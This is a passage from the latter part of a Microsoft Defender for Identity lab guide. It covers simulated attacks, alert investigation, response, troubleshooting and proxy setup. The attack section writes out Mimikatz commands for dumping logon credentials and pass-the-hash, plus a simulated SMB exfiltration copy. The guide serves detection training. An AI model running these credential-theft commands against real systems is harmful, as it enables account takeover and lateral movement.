#### Attack 2: Pass-the-Hash Attack

**On WIN11-01**, use Mimikatz to extract and use NTLM hashes:

```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe

# In Mimikatz:
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<hash>
```

[SCREENSHOT: Pass-the-Hash execution]

**Expected Detection**:
- Alert: **Suspected identity theft (pass-the-hash)**
- Severity: High

---

### Exercise 6: Data Exfiltration

#### Attack 1: Data Exfiltration over SMB

**On WIN11-01**, as **CONTOSO\JeffL**:

```powershell
# Create a large file to simulate data exfiltration
$data = "SENSITIVE DATA " * 100000
$data | Out-File "C:\Temp\sensitive.txt"

# Copy to a network share (simulating exfiltration)
Copy-Item "C:\Temp\sensitive.txt" -Destination "\\DC\Tools\exfiltrated_data.txt"

# Verify
Get-ChildItem "\\DC\Tools\exfil*"
```

[SCREENSHOT: Data exfiltration via SMB]

**Expected Detection**:
- Alert: **Data exfiltration over SMB**
- Severity: Medium

---

### Task 5: Investigate Alerts in Microsoft Defender Portal

**For each attack executed above:**

1. Navigate to **https://security.microsoft.com**
2. Go to **Incidents & alerts** → **Alerts**
3. Filter alerts by **Time range** (last 24 hours) and **Service source** (Microsoft Defender for Identity)
4. Click on each alert to view details:
   - **Alert story**: Timeline of the attack
   - **Impacted assets**: Users, devices, and IP addresses involved
   - **Evidence and Response**: Recommended actions

[SCREENSHOT: Alerts queue in Defender portal]

5. Click on an incident to see correlated alerts
6. Review the **Attack story** graph showing the full attack chain

[SCREENSHOT: Incident attack story visualization]

7. Investigate user activity:
   - Click on a user entity (e.g., JeffL)
   - Review **Timeline** of suspicious activities
   - Check **Lateral movement paths**

[SCREENSHOT: User entity investigation page]

---

### Task 6: Response Actions

**Mark an alert as resolved**:

```powershell
# No PowerShell cmdlet available - use portal
```

**In Portal**:
1. Select an alert
2. Click **Manage alert**
3. Set status to **Resolved**
4. Add classification (True positive / False positive)
5. Add comments about investigation findings

[SCREENSHOT: Alert resolution in portal]

**Contain a compromised user**:
1. Navigate to the user entity page (e.g., JeffL)
2. Click **Actions** → **Disable user in Azure AD**
3. Click **Actions** → **Force password reset**

[SCREENSHOT: User containment actions]

---

## Troubleshooting

### Issue: MDI Sensor Service Won't Start

**Symptoms**: AATPSensor service fails to start

**Resolution**:
```powershell
# Check event logs
Get-EventLog -LogName Application -Source "Azure Advanced Threat Protection Sensor" -Newest 50

# Verify gMSA can be retrieved
Test-ADServiceAccount -Identity MDIgMSA

# Verify sensor has network connectivity
Test-NetConnection -ComputerName sensorapi.atp.azure.com -Port 443

# Reinstall sensor with correct access key
```

---

### Issue: No Alerts Are Being Generated

**Symptoms**: Attacks executed but no alerts appear in portal

**Resolution**:
```powershell
# Verify sensor is sending data
Get-Service AATPSensor | Select-Object Status

# Check GPOs are applied
gpresult /H C:\Temp\gpresult.html

# Force GPO update
gpupdate /force

# Wait 10-15 minutes for initial sensor telemetry
```

---

### Issue: SAM-R Enumeration Not Working

**Symptoms**: SAM-R alerts not triggering

**Resolution**:
```powershell
# Verify SAM-R GPO is applied to domain controllers
Get-GPO -Name "Default Domain Controllers Policy" | Get-GPOReport -ReportType Html | Out-File C:\Temp\dc_gpo.html

# Check registry for SAM-R restrictions
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RestrictRemoteSam
```

---

## Appendix

### Appendix A: MDI Sensor Proxy Configuration (Optional)

<details>
<summary>Click to expand proxy configuration instructions</summary>

If your environment requires MDI sensors to communicate through a proxy server, use the following configuration.

**Prerequisites**:
- Proxy server URL (e.g., http://proxy.contoso.local:8080)
- Proxy credentials (if authentication required)

**On DC**, configure proxy settings:

```powershell
# Define proxy details
$proxyUrl = "http://proxy.contoso.local:8080"
$proxyUsername = "proxyuser"
$proxyPassword = ConvertTo-SecureString "ProxyPass123!" -AsPlainText -Force
$proxyCreds = New-Object System.Management.Automation.PSCredential($proxyUsername, $proxyPassword)

# Test proxy connectivity
Invoke-WebRequest -Uri "https://www.microsoft.com" -Proxy $proxyUrl -ProxyCredential $proxyCreds -Verbose

# Configure MDI sensor to use proxy
Set-MDISensorProxyConfiguration -ProxyUrl $proxyUrl -ProxyCredential $proxyCreds

# Verify proxy configuration
Get-MDISensorProxyConfiguration

# Restart sensor to apply changes
Restart-Service -Name AATPSensor
```

**Verify in Defender Portal**:
1. Go to **Settings** → **Identities** → **Sensors**
2. Select DC sensor
3. Verify proxy information is displayed

</details>

---

### Appendix B: Useful MDI PowerShell Cmdlets

| Cmdlet | Description |
|--------|-------------|
| `Get-MDIConfiguration` | Retrieve current MDI configuration |
| `Set-MDIConfiguration` | Configure MDI settings and create GPOs |
| `New-MDIDSA` | Create gMSA for MDI |
| `New-MDIConfigurationReport` | Generate configuration report |
| `Get-MDISensorProxyConfiguration` | View proxy settings |
| `Set-MDISensorProxyConfiguration` | Configure proxy settings |
| `Test-ADServiceAccount` | Test gMSA functionality |

**Reference**: [DefenderForIdentity PowerShell Module](https://learn.microsoft.com/en-us/powershell/module/defenderforidentity/)

---

### Appendix C: MITRE ATT&CK Mapping

| Exercise | Technique | Tactic |
|----------|-----------|--------|
| Account Enumeration | T1087 | Discovery |
| LDAP Reconnaissance | T1069 | Discovery |
| DCSync | T1003.006 | Credential Access |
| Kerberoasting | T1558.003 | Credential Access |
| Pass-the-Hash | T1550.002 | Lateral Movement |
| Remote Execution | T1047 | Execution |
| SMB Exfiltration | T1048.002 | Exfiltration |

---

## References

### Official Documentation
- [Microsoft Defender for Identity Documentation](https://learn.microsoft.com/en-us/defender-for-identity/)
- [DefenderForIdentity PowerShell Module](https://learn.microsoft.com/en-us/powershell/module/defenderforidentity/)
- [TechExcel: Defender for Identity Lab](https://microsoft.github.io/TechExcel-Defender-for-Identity/)
- [MDI Architecture](https://learn.microsoft.com/en-us/defender-for-identity/architecture)
- [MDI Prerequisites](https://learn.microsoft.com/en-us/defender-for-identity/prerequisites)

### Attack Tools (For Lab Use Only)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [ORADAD](https://github.com/ANSSI-FR/ORADAD)
- [NetSess](https://www.joeware.net/freetools/tools/netsess/)

### Additional Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [MDI Security Alerts](https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview)

---

## Lab Completion Checklist

### Day 1: Deployment
- [ ] Infrastructure verified (DC, WIN11-01, WIN11-02)
- [ ] RSAT installed on WIN11-01 and WIN11-02
- [ ] DefenderForIdentity PowerShell module installed
- [ ] AD Recycle Bin enabled
- [ ] KDS root key created
- [ ] gMSA (MDIgMSA) created and configured
- [ ] Npcap downloaded and installed on DC
- [ ] MDI sensor downloaded and installed on DC
- [ ] GPOs created using Set-MDIConfiguration
- [ ] SAM-R permissions configured
- [ ] "Log on as a Service" right granted to gMSA
- [ ] Sensor validated in Defender portal
- [ ] Alert thresholds configured for lab environment

### Day 2: Attack Simulation
- [ ] Lab users created (RonHD, JeffL, SamiraA, HoneyTokenTest)
- [ ] Security groups configured (HelpDesk)
- [ ] Attack tools downloaded
- [ ] Honey Token configured
- [ ] Reconnaissance attacks executed and detected
- [ ] Credential access attacks executed and detected
- [ ] Lateral movement attacks executed and detected
- [ ] Alerts investigated in Defender portal
- [ ] Response actions performed

---

**Lab Version**: 1.0  
**Last Updated**: November 2025  
**Domain**: contoso.local  
**Lab Duration**: 210 minutes (3.5 hours)

---

## Support and Feedback

For issues or questions about this lab:
- Review the [Troubleshooting](#troubleshooting) section
- Check Microsoft Learn documentation
- Review event logs on DC

**Disclaimer**: This lab is for educational purposes only. Attack tools should only be used in authorized lab environments. Do not use these techniques against production systems or systems you do not own.



### MDI Sensor V2 - Configured
![image](https://github.com/user-attachments/assets/7ef6f61b-b139-4505-8a20-e7d56525f28f)

### MDI routing traffic through squid proxy (containerized via ACI)
![image](https://github.com/user-attachments/assets/66507075-332e-4e16-b81f-3f28b45dc8fc)
